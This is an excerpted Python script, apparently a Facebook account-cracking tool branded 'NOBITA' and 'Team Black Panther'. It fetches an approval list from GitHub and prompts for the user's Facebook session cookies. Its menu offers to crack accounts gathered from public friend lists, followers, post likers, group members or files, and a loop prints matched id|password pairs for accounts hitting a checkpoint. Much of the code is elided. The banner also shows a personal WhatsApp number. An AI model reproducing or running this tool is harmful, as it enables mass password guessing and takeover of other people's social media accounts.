...
def uaku():
	try:
		...
		a=requests.get('https://github.com/SHIPONmrs/aprovel1.txt/blob/main/Aproovel.txt').text
		ua=open('.bbnew.txt','w')
...
def banner():
	clear()
	wel='# >☠️ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 ☠️ 𝐓𝐎 ☠️ 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ☠️ 𝐂𝐑𝐀𝐂𝐊 ☠️ 𝐓𝐎𝐎𝐋 ☠️<'
	cik2=mark(wel ,style='cyan')
	sol().print(cik2)
	ban='''
🎉AUTHOR🎉NOBITA🎉
🎉WHATSAPP🎉+8801813233621🎉   
...
d8b   db  .d88b.  d8888b. d888888b d888888b  .d8b.  
 ...
 🎭>𝐅𝐁🎭𝐍𝐎𝐁𝐈𝐓𝐀🎭
 🎭>𝐕𝐄𝐑𝐒𝐈𝐎𝐍. 𝟏.𝟎•🎭
 ✅>𝐘𝐨𝐮𝐓𝐮𝐛𝐞  𝐁𝐋𝐀𝐂𝐊  𝐏𝐀𝐍𝐓𝐇𝐄𝐑 
•🛡️𝐓𝐄𝐀𝐌🛡️𝐁𝐋𝐀𝐂𝐊🛡️𝐏𝐀𝐍𝐓𝐇𝐄𝐑🛡️•
'''
...
def login_lagi334():
	try:
		banner()
		___kontol___ = input('[|] >🎭𝐄𝐍𝐓𝐄𝐑 𝐂𝐎𝐎𝐊𝐈𝐄𝐒<🎭 : ')
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# 𝐔𝐒𝐄𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍'
	fx = mark(sg, style='green')
	sol().print(fx)
	print(x+'['+h+'•'+x+'] 𝐀𝐂𝐓𝐈𝐕𝐄 𝐔𝐒𝐄𝐑 : '+str(my_name))
	print(x+'['+h+'•'+x+'] 𝐔𝐒𝐄𝐑 𝐈𝐃     : '+str(my_id))
	print(x+'['+h+'•'+x+'] 𝐈𝐏 𝐀𝐃𝐃𝐑𝐄𝐒𝐒  : '+str(sh['origin']))
	io = '''[bold cyan][𝟎𝟏] 𝐏𝐔𝐁𝐋𝐈𝐂 𝐅𝐑𝐈𝐄𝐍𝐃𝐒      [𝟎𝟔] 𝐂𝐑𝐀𝐂𝐊 𝐅𝐑𝐎𝐌 𝐅𝐈𝐋𝐄𝐒
[𝟎𝟐] 𝐏𝐔𝐁𝐋𝐈𝐂 𝐅𝐑𝐈𝐄𝐍𝐃𝐒 (𝐁𝐊) [𝟎𝟕] 𝐂𝐇𝐄𝐂𝐊 𝐂𝐇𝐄𝐂𝐊𝐏𝐎𝐈𝐍𝐓 𝐎𝐏𝐓𝐈𝐎𝐍𝐒
[𝟎𝟑] 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑		 [𝟎𝟖] 𝐂𝐇𝐄𝐂𝐊 𝐂𝐑𝐀𝐂𝐊 𝐑𝐄𝐒𝐔𝐋𝐓𝐒
[𝟎𝟒] 𝐋𝐈𝐊𝐄𝐒 𝐓𝐇𝐄 𝐏𝐎𝐒𝐓      [𝟎𝟗] 𝐓𝐈𝐏𝐒 𝐂𝐑𝐀𝐂𝐊
[𝟎𝟓] 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐌𝐁𝐄𝐑𝐒       [𝟎𝟎] 𝐋𝐎𝐆 𝐎𝐔𝐓[bold cyan]'''
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='[bold cyan] • 𝐌𝐄𝐍𝐔 𝐂𝐑𝐀𝐂𝐊• [/bold cyan]'))
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> 𝐍𝐎𝐁𝐈𝐓𝐀       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET 𝐍𝐎𝐁𝐈𝐓𝐀, PERIKSA & COBA LAGI'
